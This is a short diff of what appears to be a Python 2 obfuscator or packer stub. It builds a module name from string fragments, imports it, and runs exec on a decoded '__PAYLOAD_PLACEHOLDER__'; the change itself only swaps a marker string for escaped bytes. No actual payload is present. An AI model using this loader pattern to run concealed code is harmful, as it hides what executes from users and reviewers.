@@ -1,4 +1,4 @@
-____ = "PY_2.6"
+____ = "\xFF\xFE\x0A\x20\xCA\xDD"
 # -*- coding: utf-8 -*-
 
 a = "ma"
@@ -17,4 +17,4 @@ x = __import__(a + u + c)
 # exec
 exec getattr(x, d + q + e)(b("__PAYLOAD_PLACEHOLDER__"))
 
-____ = "PY_2.6"
+____ = "\xFF\xFE\x0A\x20\xCA\xDD"
